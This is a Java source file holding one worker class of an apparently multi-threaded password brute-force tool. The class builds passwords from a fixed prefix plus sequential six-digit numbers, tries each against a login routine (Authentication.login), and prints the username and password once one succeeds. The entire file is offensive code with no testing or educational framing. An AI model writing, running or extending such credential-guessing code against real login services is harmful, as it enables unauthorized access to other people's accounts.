package com.threads;

import com.fm.login.Authentication;

public class Checker {

	public void checker(String user, String first, int i) {

		boolean op;
		Authentication a = new Authentication();
		String pass;
		for (int j = 10000 * i; j <= ((i + 1) * 10000 - 1); j++) {
			pass = first + String.format("%06d", j);
			op = a.login(user, pass);
			if (op) {
				System.out.println("Password Cracked with Username: " + user + " and password: " + pass);
				Thread_creator.result1 = true;

			}
		}
	}
}
